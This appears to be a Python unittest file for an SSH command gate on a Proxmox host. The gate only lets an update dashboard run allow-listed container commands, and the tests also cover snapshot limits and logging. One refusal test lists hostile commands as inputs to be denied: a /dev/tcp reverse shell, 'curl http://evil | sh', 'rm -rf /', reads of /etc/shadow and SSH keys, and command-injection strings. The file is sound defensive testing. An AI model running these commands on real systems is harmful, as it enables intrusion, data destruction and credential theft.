import importlib.util
import io
import os
import shutil
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

from tests.helpers import ROOT
from udash import core
from udash.catalog import CATALOG, auto_service

LIST = ("VMID       Status     Lock         Name\n101        running                 secure01\n"
        "106        running                 homarr\n113        running                 autobrr\n"
        "126        running                 updatedash\n")
SNAPS = "`-> pre-update-20261010-005216  2026-10-10 00:52:16\n`-> pre-update-20261011-005216  later\n"
OK_CMD = core.COMMUNITY_UPDATE


def load_gate():
    spec = importlib.util.spec_from_file_location("gate", ROOT / "pve-gate.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


class GateCase(unittest.TestCase):
    snapshots = SNAPS

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.d, True)
        self.g = load_gate()
        self.g.ALLOW_FILE = f"{self.d}/allow"
        self.g.MANAGE_FLAG = f"{self.d}/manage"
        self.g.PROTECTED_FILE = f"{self.d}/protected"
        self.g.COMMANDS_FILE = f"{self.d}/commands"
        Path(self.g.ALLOW_FILE).write_text("106\n113\n")
        self.syslog = []

    def run_gate(self, cmd):
        """Returns (exit code, stdout, stderr, execv args or None)."""
        out, err, called = io.StringIO(), io.StringIO(), []
        snaps = self.snapshots

        def fake_run(argv, **kw):
            if argv[1] == "list":
                return mock.Mock(stdout=LIST, stderr="", returncode=0)
            if argv[1] == "listsnapshot":
                return mock.Mock(stdout=snaps, stderr="", returncode=0)
            if argv[1] == "status":
                return mock.Mock(stdout="", stderr="", returncode=0 if argv[2] in ("101", "106", "113", "126") else 2)
            raise AssertionError(argv)

        code = 0
        with mock.patch.dict(os.environ, {"SSH_ORIGINAL_COMMAND": cmd}), \
                mock.patch.object(self.g.subprocess, "run", fake_run), \
                mock.patch.object(self.g.os, "execv", lambda p, a: called.append(a)), \
                mock.patch.object(self.g.syslog, "syslog", lambda lvl, msg: self.syslog.append(msg)), \
                mock.patch.object(self.g.syslog, "openlog", lambda *a, **k: None), \
                redirect_stdout(out), redirect_stderr(err):
            try:
                self.g.main()
            except SystemExit as e:
                code = e.code or 0
        return code, out.getvalue(), err.getvalue(), (called[0] if called else None)

    def exec_cmd(self, ctid, command):
        import shlex
        return self.run_gate(f"pct exec {ctid} -- bash -c {shlex.quote(command)}")

    def allowed(self):
        return {x for x in Path(self.g.ALLOW_FILE).read_text().split() if x.isdigit()}


class TestGate(GateCase):
    def test_exec_only_for_allowed_ids_and_commands(self):
        code, _, _, called = self.exec_cmd(106, OK_CMD)
        self.assertEqual((code, called[:5]), (0, ["pct", "exec", "106", "--", "bash"]))
        self.assertEqual(self.exec_cmd(101, OK_CMD)[0], 126)                   # not an allowed container
        self.assertEqual(self.run_gate("pct snapshot 113 pre-update-20261010-005216")[0], 0)
        self.assertEqual(self.run_gate("pct snapshot 113 evil;rm")[0], 126)
        self.assertEqual(self.run_gate("pct listsnapshot 106")[3][:2], ["pct", "listsnapshot"])
        self.assertEqual(self.run_gate("pct delsnapshot 106 pre-update-20261010-005216")[0], 0)
        self.assertEqual(self.run_gate("pct delsnapshot 106 other")[0], 126)

    def test_arbitrary_commands_are_refused(self):
        for cmd in ("id", "cat /etc/shadow", "rm -rf /", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1",
                    "curl http://evil | sh", "cat /root/.bash_history 2>/dev/null || cat /opt/*_version.txt 2>/dev/null",
                    "cat /root/.ssh/id_ed25519", "cat /root/.sonarr; id",
                    core.COMMUNITY_UPDATE + "; id", core.COMMUNITY_UPDATE + "\nid", core.OS_UPGRADE + " && id",
                    "apt-get install -y --only-upgrade jellyfin; id", "apt-get install -y evilpkg",
                    "apt-get update -qq >/dev/null 2>&1; apt-cache policy $(id)",
                    "apt-get update -qq >/dev/null 2>&1; apt-cache policy ../../x",
                    "x" * 5000, ""):
            code, _, err, called = self.exec_cmd(106, cmd)
            self.assertEqual(code, 126, cmd[:60])
            self.assertIsNone(called)
            self.assertIn("allow list", err)

    def test_everything_the_dashboard_generates_is_accepted(self):
        """The gate vocabulary and udash/core.py must not drift apart."""
        cmds = {core.COMMUNITY_UPDATE, core.OS_UPGRADE, core.cmd_os_count(True), core.cmd_os_count(False)}
        for pat, preset in CATALOG:
            svc = auto_service(106, pat)
            if svc.get("current"):
                cmds.add(svc["current"])
            lat = svc.get("latest") or {}
            if lat.get("type") == "apt":
                cmds.add(core.cmd_apt_policy(lat["package"]))
                cmds.add(core.cmd_apt_install(lat["package"]))
        self.assertGreater(len(cmds), 10)
        for cmd in cmds:
            self.assertEqual(self.exec_cmd(106, cmd)[0], 0, cmd)

    def test_custom_commands_need_host_approval(self):
        custom = "/usr/local/bin/my-update.sh --yes"
        self.assertEqual(self.exec_cmd(106, custom)[0], 126)
        Path(self.g.COMMANDS_FILE).write_text(f"# approved by me\n{custom}\n")
        self.assertEqual(self.exec_cmd(106, custom)[0], 0)
        self.assertEqual(self.exec_cmd(106, custom + " ")[0], 126)              # exact match only
        self.assertEqual(self.exec_cmd(106, "# approved by me")[0], 126)        # comments are not commands

    def test_everything_else_is_refused(self):
        for cmd in ("", "bash -c id", "pct destroy 106", "pct exec 106 -- bash -c id; reboot", "pct exec 106 -- sh -c id",
                    "pct exec 106 -- bash -c id extra", "pct stop 106", "pct list --all", "allow add 101",
                    "pct rollback 106 x", "id", "pct exec 106 -- bash -c 'unterminated", "pct enter 106",
                    "pct exec 106 bash -c id", "pct config 106"):
            self.assertEqual(self.run_gate(cmd)[0], 126, cmd)

    def test_list_is_filtered(self):
        code, out, _, _ = self.run_gate("pct list")
        self.assertEqual(code, 0)
        self.assertIn("homarr", out)
        self.assertNotIn("secure01", out)
        self.assertNotIn("updatedash", out)
        self.assertEqual(self.run_gate("allow list")[1].split(), ["106", "113"])

    def test_snapshot_cap(self):
        full = "".join(f"`-> pre-update-202610{d:02d}-000000\n" for d in range(1, self.g.MAX_SNAPSHOTS + 1))
        type(self).snapshots = full
        try:
            code, _, err, _ = self.run_gate("pct snapshot 106 pre-update-20261020-000000")
            self.assertEqual(code, 126)
            self.assertIn("remove old ones", err)
            self.assertEqual(self.run_gate("pct delsnapshot 106 pre-update-20261001-000000")[0], 0)   # cleanup still possible
        finally:
            type(self).snapshots = SNAPS

    def test_every_decision_is_logged_on_the_host(self):
        self.exec_cmd(106, OK_CMD)
        self.exec_cmd(106, "id")
        self.run_gate("pct destroy 106")
        text = "\n".join(self.syslog)
        self.assertIn("ok exec 106", text)
        self.assertEqual(sum(1 for m in self.syslog if m.startswith("DENIED")), 2)
        self.assertNotIn("\n", "".join(self.syslog))


class TestGateManagement(GateCase):
    def test_gui_management_off_by_default(self):
        self.assertEqual(self.run_gate("allow add 101")[0], 126)
        self.assertEqual(self.run_gate("allow remove 106")[0], 126)
        self.assertEqual(self.run_gate("pct list --all")[0], 126)
        self.assertEqual(self.allowed(), {"106", "113"})

    def test_gui_management_on(self):
        Path(self.g.MANAGE_FLAG).write_text("126\n")
        self.assertIn("secure01", self.run_gate("pct list --all")[1])
        self.assertEqual(self.run_gate("allow add 101")[0], 0)
        self.assertEqual(self.allowed(), {"101", "106", "113"})
        self.assertEqual(self.run_gate("allow remove 113")[0], 0)
        self.assertEqual(self.allowed(), {"101", "106"})
        self.assertEqual(self.exec_cmd(113, OK_CMD)[0], 126)                    # removal is immediate
        for cmd in ("allow add 126", "allow add 999", "allow add 12x", "allow add -1", "allow add 1 2", "allow nuke 101"):
            self.assertEqual(self.run_gate(cmd)[0], 126, cmd)
        self.assertEqual(self.allowed(), {"101", "106"})

    def test_protected_ids_cannot_be_changed_via_the_dashboard(self):
        Path(self.g.MANAGE_FLAG).write_text("126\n")
        Path(self.g.PROTECTED_FILE).write_text("113  # vaultwarden\n101\n")
        self.assertEqual(self.run_gate("allow remove 113")[0], 126)
        self.assertEqual(self.run_gate("allow add 101")[0], 126)
        self.assertEqual(self.allowed(), {"106", "113"})
        self.assertEqual(self.run_gate("allow protected")[1].split(), ["101", "113"])
        self.assertEqual(self.exec_cmd(113, OK_CMD)[3][2], "113")               # already-allowed protected CTs can be updated

    def test_allow_file_written_atomically_with_header(self):
        Path(self.g.MANAGE_FLAG).write_text("126\n")
        self.run_gate("allow add 101")
        text = Path(self.g.ALLOW_FILE).read_text()
        self.assertTrue(text.startswith("#"))
        self.assertEqual(oct(os.stat(self.g.ALLOW_FILE).st_mode & 0o777), "0o644")
        self.assertFalse(list(Path(self.d).glob("*.tmp")))
        self.assertTrue(any("ok allow add 101" in m for m in self.syslog))


if __name__ == "__main__":
    unittest.main()
